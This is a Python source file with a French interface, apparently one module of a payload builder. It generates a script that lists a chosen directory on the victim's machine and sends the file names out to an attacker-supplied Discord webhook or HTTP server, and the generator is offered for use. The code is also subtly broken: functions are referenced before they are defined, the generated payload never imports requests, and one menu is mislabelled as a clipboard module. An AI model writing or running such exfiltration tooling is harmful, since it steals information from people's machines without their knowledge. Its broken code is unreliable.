import os
from colorama import Fore, Style
import time
def clear():
    os.system("cls")

def affichage():
    clear()
    print("=== Configuration Directory Listing ===\n\n")
    print(f"""

            {Fore.YELLOW}Options :
    {Fore.WHITE}1. Chemin du répertoire à lister
    2. Inclure les fichiers cachés
    3. Délai avant listing (en secondes)
          
            {Fore.YELLOW}Sortie et envoi:
    4. Envoi sur discord
    5. Envoi sur serveur HTTP

     {Fore.GREEN}                    
Tapez : set <num> pour configurer
Tapez : show pour afficher la config
Tapez : create pour générer
Tapez : exit pour quitter
            """)
    
def directory_listing_module():
    clear()
    choix = {
        "Chemin du répertoire à lister": None,
        "Inclure les fichiers cachés": None,
        "Délai avant listing": None,
        "Envoi sur Discord": None,
        "Envoi sur serveur HTTP": None,
    }

    def chemin_option():
        clear()
        chemin = input("Entrez le chemin du répertoire à lister : ")
        choix["Chemin du répertoire à lister"] = chemin

    def cache_option():
        clear()
        cache = input("Inclure les fichiers cachés ? (oui/non) : ")
        if cache.lower() == "oui":
            choix["Inclure les fichiers cachés"] = True
        else:
            choix["Inclure les fichiers cachés"] = None

    def delai_option():
        clear()
        delai = input("Délai avant listing en secondes : ")
        choix["Délai avant listing"] = int(delai)

    options = [
        ("Chemin du répertoire à lister", chemin_option),    
        ("Inclure les fichiers cachés", cache_option),
        ("Délai avant listing", delai_option),
        ("Envoi sur Discord", envoi_discord),
        ("Envoi sur serveur HTTP", envoi_http)

    ]

    def envoi_discord():
        clear()
        webhook = input("Entrez l'URL du webhook discord : ")
        choix["Envoi sur Discord"] = webhook

    def envoi_http():
        clear()
        reponse = input("Entrez l'URL de votre serveur HTTP : ")
        choix["Envoi sur serveur HTTP"] = reponse

    def contrôle_envoi():
        if choix["Envoi sur Discord"] and choix["Envoi sur serveur HTTP"]:
            print(Fore.RED + "Veuillez choisir une seule option d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
            input("Appuyez sur Entrée pour continuer...")
            choix["Envoi sur Discord"] = None
            choix["Envoi sur serveur HTTP"] = None
        if choix["Envoi sur Discord"] is None and choix["Envoi sur serveur HTTP"] is None:
            print(Fore.RED + "Veuillez choisir au moins une option d'envoi (Discord ou HTTP)." + Style.RESET_ALL)
            input("Appuyez sur Entrée pour continuer...")


    def create_payload():
        clear()
        if choix["Chemin du répertoire à lister"] is None:
            print(Fore.RED + "Veuillez configurer le chemin du répertoire à lister avant de créer le payload." + Style.RESET_ALL)
            input("Appuyez sur Entrée pour continuer...")
            return
        print("Création du payload Directory Listing avec la configuration suivante :")
        filename = "dirlist_payload.py"
        payload_path = os.path.join("Option", "modules", "payload", "payload_created", filename)
        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)

        with open(payload_path, "w", encoding="utf-8") as f:
            f.write("import os\n")
            f.write("import time\n\n")
            f.write("def list_directory():\n")

            if choix["Délai avant listing"] is not None:
                f.write(f"    time.sleep({choix['Délai avant listing']})\n")

            chemin = choix["Chemin du répertoire à lister"] or "."

            if choix["Inclure les fichiers cachés"]:
                f.write(f"    files = os.listdir(r'{chemin}')\n")
            else:
                f.write(f"    files = [f for f in os.listdir(r'{chemin}') if not f.startswith('.')] \n")
            
            f.write("    for file in files:\n")
            f.write("        print(file)\n\n")
            if choix["Envoi sur Discord"]:
                f.write(f"    webhook_url = '{choix['Envoi sur Discord']}'\n")
                f.write("    data = {'content': '\\n'.join(files)}\n")
                f.write("    requests.post(webhook_url, data=data)\n\n")

            if choix["Envoi sur serveur HTTP"]:
                f.write(f"    http_url = '{choix['Envoi sur serveur HTTP']}'\n")
                f.write("    data = {'files': files}\n")
                f.write("    requests.post(http_url, json=data)\n\n")
            
            f.write("if __name__ == '__main__':\n")
            f.write("    list_directory()\n")
        print(f"Payload créé et sauvegardé dans {filename}")
        
    while True:
        affichage()
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)

        if cmd.lower() == "exit":
            break

        elif cmd.lower().startswith("set "):
            try:
                option_choix = int(cmd.split()[1]) - 1
                if 0 <= option_choix < len(options):
                    options[option_choix][1]()
                else:
                    print(Fore.RED + "Numéro d'option invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)

        if cmd.lower() == "show":
            print("\nConfiguration actuelle du module Clipboard :")
            for option, value in choix.items():
                print(f"{option} : {value}")
            input("\nAppuyez sur Entrée pour continuer...")

        if cmd.lower() == "create":
            create_payload()
            break
